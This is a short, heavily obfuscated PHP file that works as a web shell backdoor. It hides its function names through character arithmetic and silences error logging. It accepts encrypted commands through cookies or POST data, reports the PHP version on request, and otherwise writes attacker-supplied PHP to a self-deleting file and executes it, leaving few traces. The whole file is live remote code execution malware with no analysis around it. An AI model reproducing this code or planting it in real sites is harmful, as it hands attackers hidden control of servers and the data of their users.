<?php $xdnntjz = chr(781-679).'i'."\x6c".'e'."\137".'p'."\x75".'t'.chr(95)."\143".chr(307-196).'n'."\x74"."\145"."\156"."\x74"."\x73";
$nrxxbybtq = "\x62".'a'."\x73"."\145"."\66".'4'.chr(645-550)."\144".chr(101).'c'."\x6f".chr(100)."\145";
$pnngccx = chr(484-379).chr(360-250)."\x69"."\137".chr(666-551)."\145"."\164";
$fkmsna = 'u'.chr(864-754)."\x6c".'i'.'n'.'k';


@$pnngccx(chr(563-462).'r'.chr(114)."\157"."\162".'_'.'l'."\x6f"."\x67", NULL);
@$pnngccx(chr(108)."\x6f"."\x67"."\x5f"."\145".'r'."\162".chr(111)."\162".chr(171-56), 0);
@$pnngccx("\x6d".chr(97)."\170"."\137".'e'.'x'."\x65"."\x63"."\x75".chr(190-74).chr(511-406).'o'.chr(110)."\x5f".'t'.'i'."\155".chr(101), 0);
@set_time_limit(0);

function qpmvuj($laywhrtn, $edndmy)
{
    $swmgrqi = "";
    for ($bacbhjdhxs = 0; $bacbhjdhxs < strlen($laywhrtn);) {
        for ($j = 0; $j < strlen($edndmy) && $bacbhjdhxs < strlen($laywhrtn); $j++, $bacbhjdhxs++) {
            $swmgrqi .= chr(ord($laywhrtn[$bacbhjdhxs]) ^ ord($edndmy[$j]));
        }
    }
    return $swmgrqi;
}

$yxextudzam = array_merge($_COOKIE, $_POST);
$wtsdkyz = '5760b412-7c71-4d9a-b524-54307bcf7145';
foreach ($yxextudzam as $cgyul => $laywhrtn) {
    $laywhrtn = @unserialize(qpmvuj(qpmvuj($nrxxbybtq($laywhrtn), $wtsdkyz), $cgyul));
    if (isset($laywhrtn['a'."\153"])) {
        if ($laywhrtn[chr(828-731)] == "\151") {
            $bacbhjdhxs = array(
                'p'."\x76" => @phpversion(),
                "\x73"."\166" => "3.5",
            );
            echo @serialize($bacbhjdhxs);
        } elseif ($laywhrtn[chr(828-731)] == chr(101)) {
            $ovpjdbqf = "./" . md5($wtsdkyz) . "\56".chr(645-540).chr(110)."\x63";
            @$xdnntjz($ovpjdbqf, "<" . chr(191-128).chr(112)."\x68"."\160".chr(32)."\100".'u'.chr(165-55).chr(108).chr(643-538).chr(110)."\153"."\x28"."\x5f".chr(95).chr(182-112).chr(1020-947).chr(323-247).chr(69).chr(95).chr(95).chr(41)."\73"."\40" . $laywhrtn[chr(413-313)]);
            @include($ovpjdbqf);
            @$fkmsna($ovpjdbqf);
        }
        exit();
    }
}

